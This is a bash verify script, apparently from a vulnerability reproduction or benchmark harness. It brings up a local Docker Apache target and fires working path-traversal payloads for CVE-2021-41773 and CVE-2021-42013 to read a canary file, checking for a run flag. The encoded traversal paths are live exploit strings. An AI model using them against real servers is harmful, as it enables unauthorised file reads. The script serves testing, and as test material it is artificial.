#!/usr/bin/env bash
# verify.sh --seed|--residual — CVE-2021-41773/42013 path traversal canary read.
# 0=flag in body  10=blocked  20=env  30=args
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

APP_PORT=""
for _ in $(seq 1 30); do
  APP_PORT="$(dc port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$APP_PORT" ]]; then
    break
  fi
  sleep 1
done
if [[ -z "$APP_PORT" ]]; then
  echo "verify: cannot resolve ${VERSION}:80 (need --profile)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$APP_PORT"
BASE="http://127.0.0.1:${APP_PORT}"

ready=0
for _ in $(seq 1 60); do
  if curl -fsS --max-time 5 "${BASE}/" >/dev/null 2>&1; then
    ready=1; break
  fi
  sleep 2
done
if [[ "$ready" != 1 ]]; then echo "verify: ${VERSION} HTTP timeout on :${APP_PORT}" >&2; exit 20; fi

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2021-41773: single-encoded .%2e / %2e%2e (V0 2.4.49; blocked on V1 2.4.50)
  P="/pub/.%2e/%2e%2e/%2e%2e/%2e%2e/canary.txt"
else
  # CVE-2021-42013 residual (inline): %%32%65 double-encode (V1 2.4.50 still open)
  SEG="%%32%65%%32%65"
  P="/pub/$SEG/$SEG/$SEG/$SEG/canary.txt"
fi

BODY="$(curl --path-as-is -sS -m 15 "$BASE$P")" || { echo "curl failed" >&2; exit 20; }
echo "$BODY"
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
